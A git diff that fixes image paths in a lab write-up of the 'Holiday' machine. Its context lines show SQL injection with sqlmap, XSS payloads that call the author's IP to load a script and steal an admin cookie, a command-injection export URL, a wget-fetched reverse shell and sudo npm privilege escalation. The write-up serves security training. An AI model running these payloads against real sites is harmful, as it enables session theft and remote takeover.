@@ -41,19 +41,19 @@ Other than potential username enumeration, there's not a whole lot we can do wih
 ## Website Enumeration
 Checking out the landing page shows just an outline of a hexagon and no other content.
 
-![](../assets/img/2026-05-06-Holiday/1.png)
+![](/assets/img/2026-05-06-Holiday/1.png)
 
 Interestingly, my scans discover absolutely nothing which makes me think we'll need to manipulate our requests to search for functionality on this page. A few of my attempts at this included fuzzing for hidden URL parameters and .txt, .js, and .md files as well as looking at the image's metadata, however nothing came of them.
 
 Capturing a request to the page in Burp Suite confirms that the site is built with Node.js via the `X-Powered-By: Express` response header, but it also returns a **304 Not Modified** code.
 
-![](../assets/img/2026-05-06-Holiday/2.png)
+![](/assets/img/2026-05-06-Holiday/2.png)
 
 A bit of digging shows that this status code indicates that the requested resource has not changed since the last time of access. When our browser receives this code, it loads the content from its local cache instead of re-downloading it from the server.
 
 With this strange behavior from the site, I tested a few common pages to see if my tools were acting wonky which reveals a few that redirect me to a login page.
 
-![](../assets/img/2026-05-06-Holiday/3.png)
+![](/assets/img/2026-05-06-Holiday/3.png)
 
 A bit of fiddling around with different request structures shows that the site was most likely filtering our User Agent for any suspicious ones. Changing it to something arbitrary will return 404s but a short, valid UA such as Linux succeeds.
 
@@ -93,7 +93,7 @@ agent                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 10
 ### SQL Injection
 Testing this login panel for SQL injection with known bad characters returns an error code only while using double quotes. Anything else will respond with **"Invalid Username"**, which could let us enumerate valid users as well.
 
-![](../assets/img/2026-05-06-Holiday/4.png)
+![](/assets/img/2026-05-06-Holiday/4.png)
 
 That response almost guarantees that it's prone to SQLi, so I capture a POST request to this login page, save the whole thing to a file, and send it over to SQLmap to save on time.
 
@@ -101,7 +101,7 @@ That response almost guarantees that it's prone to SQLi, so I capture a POST req
 └─$ sqlmap -r login.req --batch -level 5 -risk 3 --tables
 ```
 
-![](../assets/img/2026-05-06-Holiday/5.png)
+![](/assets/img/2026-05-06-Holiday/5.png)
 
 The results show that the site is using SQLite and the username field is vulnerable to boolean-based blind SQL injection, making this a pain to do manually. 
 
@@ -113,24 +113,24 @@ Enumerating the tables gives us a few interesting ones to look at.
 └─$ sqlmap -r login.req --batch -level 5 -risk 3 -T users --dump
 ```
 
-![](../assets/img/2026-05-06-Holiday/6.png)
+![](/assets/img/2026-05-06-Holiday/6.png)
 
 The users table gives us an MD5 hash for RickA which is easily crackable by sending it over to a site like [Hashes.com](https://hashes.com/en/decrypt/hash) or [Crackstation.net](https://crackstation.net/).
 
-![](../assets/img/2026-05-06-Holiday/7.png)
+![](/assets/img/2026-05-06-Holiday/7.png)
 
 ### Stored Cross-Site Scripting
 Dumping the other tables only gives us a few session identifiers that don't function, so I move on to the site's internals. As the title implies, this is used to manage bookings requests.
 
-![](../assets/img/2026-05-06-Holiday/8.png)
+![](/assets/img/2026-05-06-Holiday/8.png)
 
 Clicking on any of the UUID links brings us to the booking details page for each person. Hovering over the header's title reveals the hostname which can be added to our `/etc/hosts` file.
 
-![](../assets/img/2026-05-06-Holiday/9.png)
+![](/assets/img/2026-05-06-Holiday/9.png)
 
 We are able to add a note to each booking which looks to be reviewed by an administrator every minute or so. A test run shows that it doesn't block us from entering any special characters, making this a prime target for Cross-Site Scripting.
 
-![](../assets/img/2026-05-06-Holiday/10.png)
+![](/assets/img/2026-05-06-Holiday/10.png)
 
 ## Exploitation
 
@@ -141,7 +141,7 @@ I try a few payloads to see if the page will store it Unsanitized, however it se
 <img src=http://10.10.14.243/test />
 ```
 
-![](../assets/img/2026-05-06-Holiday/11.png)
+![](/assets/img/2026-05-06-Holiday/11.png)
 
 We can use this to steal the administrator's cookie and escalate privileges on the site. Attempting to use the standard document cookie payload for this fails due to the site filtering out single and double quotes. Referring to [PayloadAllTheThings' XSS cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) shows that we can bypass this by decoding it from CharCode.
 
@@ -162,7 +162,7 @@ It took a while of testing and going down lists of payloads wrappers, but I foun
 <img src="/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,50,52,51,47,116,101,115,116,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59))</script>" />
 ```
 
-![](../assets/img/2026-05-06-Holiday/12.png)
+![](/assets/img/2026-05-06-Holiday/12.png)
 
 Now we just need to write some JavaScript to send the victim's cookie back to our machine. I tried more simple code where it would fetch a non-existent page on another web server and document the cookie, but it kept failing to return anything. Eventually, I realized that the page wasn't being loaded by time it documented it, so I added an event listener that would resolve this issue.
 
@@ -174,29 +174,29 @@ window.addEventListener('DOMContentLoaded', function(e) {
 
 Sending another payload for review finally rewards us with an Administrator cookie which we can swap out to gain access to the `/admin` page.
 
-![](../assets/img/2026-05-06-Holiday/13.png)
+![](/assets/img/2026-05-06-Holiday/13.png)
 
 ### Command Injection
 This page allows us to export bookings and notes respectively, downloading them to our local machine in ASCII format.
 
-![](../assets/img/2026-05-06-Holiday/14.png)
+![](/assets/img/2026-05-06-Holiday/14.png)
 
 Capturing a request shows that we supply a table parameter which is pulled from the SQLite database.
 
-![](../assets/img/2026-05-06-Holiday/15.png)
+![](/assets/img/2026-05-06-Holiday/15.png)
 
 Every table succeeds except for the sqlite_master one which returns an error about our use of an underscore. The response tells us that ampersands are apart of the whitelist which was intriguing to me since SQLite doesn't use them in its queries.
 
-![](../assets/img/2026-05-06-Holiday/16.png)
+![](/assets/img/2026-05-06-Holiday/16.png)
 
 Depending on how this function is built, we may be able to use this ampersand to execute other commands. Attempting to use an it as apart of the export request succeeds after URL-encoding it, confirming that this page is vulnerable to command injection. 
 
-![](../assets/img/2026-05-06-Holiday/17.png)
+![](/assets/img/2026-05-06-Holiday/17.png)
 
 ### Initial Foothold
 Now, I use it to upload a reverse shell using wget and hex encoding my IP address since the site blocks the use of periods. We can do this from [CyberChef](https://gchq.github.io/CyberChef/) by converting our IP without periods from decimal to hex and then prepending 0x to the string.
 
-![](../assets/img/2026-05-06-Holiday/18.png)
+![](/assets/img/2026-05-06-Holiday/18.png)
 
 The reverse shell is just a bash one-liner:
 
@@ -218,7 +218,7 @@ Then we execute it the same way:
 /admin/export?table=fake%26bash+shell
 ```
 
-![](../assets/img/2026-05-06-Holiday/19.png)
+![](/assets/img/2026-05-06-Holiday/19.png)
 
 At this point we can grab the user flag from their home directory and start looking at ways to escalate privileges to root.
 
@@ -227,7 +227,7 @@ At this point we can grab the user flag from their home directory and start look
 ### Abusing NPM with Sudo
 Displaying the contents of Algernon's home directory reveal a .npm folder and listing Sudo permissions shows that we can execute that binary using the `i` option without a password.
 
-![](../assets/img/2026-05-06-Holiday/20.png)
+![](/assets/img/2026-05-06-Holiday/20.png)
 
 This is just shorthand for npm install, which means we can use this to install malicious JSON packages to the system. One feature of such packages is the use of preinstall scripts, which execute commands before the install takes place. [GTFOBins](https://gtfobins.org/gtfobins/npm/#shell) has a method for obtaining root privs via this binary, however we need to tweak it a bit.
 
@@ -239,6 +239,6 @@ By creating a new package with this option enabled, we can execute commands on b
 └─$ sudo /usr/bin/npm i -C . --unsafe
 ```
 
-![](../assets/img/2026-05-06-Holiday/21.png)
+![](/assets/img/2026-05-06-Holiday/21.png)
 
 Finally, we can grab the root flag under their home directory to complete this challenge. Overall, this was an amazing box and I'd say this box's difficulty laid in troubleshooting the many payloads to get our exploits to actually work, rather than discovering them. I hope this was helpful to anyone following along or stuck like I was and happy hacking!
